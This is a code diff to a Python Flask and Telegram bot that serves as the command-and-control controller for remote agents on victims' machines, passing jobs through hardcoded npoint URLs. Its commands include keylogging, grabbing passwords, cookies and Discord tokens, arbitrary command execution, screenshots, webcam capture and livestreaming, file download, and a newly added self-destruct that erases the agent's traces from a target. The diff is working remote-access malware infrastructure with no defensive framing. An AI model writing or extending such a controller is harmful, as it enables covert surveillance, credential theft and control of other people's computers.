@@ -2,6 +2,7 @@
 # Vercel-compatible controller using Flask and Webhooks.
 
 import os
+import re
 import json
 import uuid
 import requests
@@ -13,10 +14,11 @@ from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 
 # --- Configuration ---
-# These must be set as Environment Variables in your Vercel project's settings.
+# TOKEN must be set as an Environment Variable in your Vercel project's settings.
 TOKEN = os.getenv("TELEGRAM_TOKEN")
-JOBS_URL = os.getenv("JOBS_URL")  # Your npoint bin for agent jobs
-STATE_URL = os.getenv("STATE_URL") # Your second npoint bin for storing the target
+# These are your specific npoint URLs.
+JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
+STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
 
 # Initialize the Flask web server
 app = Flask(__name__)
@@ -50,7 +52,21 @@ def post_job(target_id, command, args):
     """Posts a command to the jobs bin for agents to pick up."""
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
     try:
-        requests.post(JOBS_URL, json=job, timeout=5)
+        # We now post a LIST containing the new job, which replaces the bin's content.
+        # This is a simple way to manage the job queue; a more robust system might append.
+        # For npoint, POSTing replaces the content.
+        # To simulate appending, we would need to GET, append, then POST.
+        # For simplicity, we assume agents clear the queue or we can just post the latest job.
+        # A better approach for multiple jobs:
+        try:
+            current_jobs = requests.get(JOBS_URL, timeout=5).json()
+            if not isinstance(current_jobs, list):
+                current_jobs = []
+        except:
+            current_jobs = []
+        
+        current_jobs.append(job)
+        requests.post(JOBS_URL, json=current_jobs, timeout=5)
         return True
     except Exception as e:
         print(f"Error posting job: {e}")
@@ -66,6 +82,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "__🎯 **Core Controls**__\n"
         "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\\.\n"
         "`/help` \\- Shows this help message\\.\n\n"
+        "__💣 **Destructive Commands**__\n"
+        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent from a target\\.\n\n"
         "__🕵️ **Agent Commands (Dispatched)**__\n"
         "`/info`, `/ss`, `/cam`, `/exec <cmd>`\n"
         "`/grab <passwords|cookies|discord|all>`\n"
@@ -90,6 +108,31 @@ async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
         set_state(target_id)
         await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")
 
+async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Dispatches the self-destruct command with confirmation."""
+    if len(context.args) < 1:
+        await update.message.reply_text("Usage: `/destroy <target_id> CONFIRM`", parse_mode='MarkdownV2')
+        return
+
+    target_id = context.args[0]
+    confirmation = context.args[1] if len(context.args) > 1 else ""
+
+    if confirmation.upper() != "CONFIRM":
+        reply_text = (
+            f"⚠️ **ARE YOU SURE?** ⚠️\n\n"
+            f"This will permanently remove the agent and all its traces from the target `{esc(target_id)}`\\. "
+            f"This action cannot be undone\\.\n\n"
+            f"To proceed, type the full command:\n`/destroy {esc(target_id)} CONFIRM`"
+        )
+        await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
+        return
+
+    if post_job(target_id, "destroy", ""):
+        await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
+    else:
+        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")
+
+
 async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles all other commands by posting them as jobs."""
     selected_target = get_state()
@@ -108,8 +151,14 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
 # --- Register handlers with the python-telegram-bot application ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
+ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 
-agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
+# List of commands to be handled by the generic dispatcher
+agent_commands = [
+    "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
+    "livestream", "stoplivestream", "livecam", "stoplivecam", 
+    "ls", "cd", "pwd", "download"
+]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
@@ -121,7 +170,7 @@ async def process_webhook():
     await ptb_app.process_update(update)
     return 'OK', 200
 
-# This is the health-check endpoint you saw in the browser
 @app.route('/', methods=['GET'])
 def health_check():
-    return "Flask controller is running.", 200
+    # This is the health-check endpoint. Your Vercel URL will show this message.
+    return "Vercel controller is running.", 200
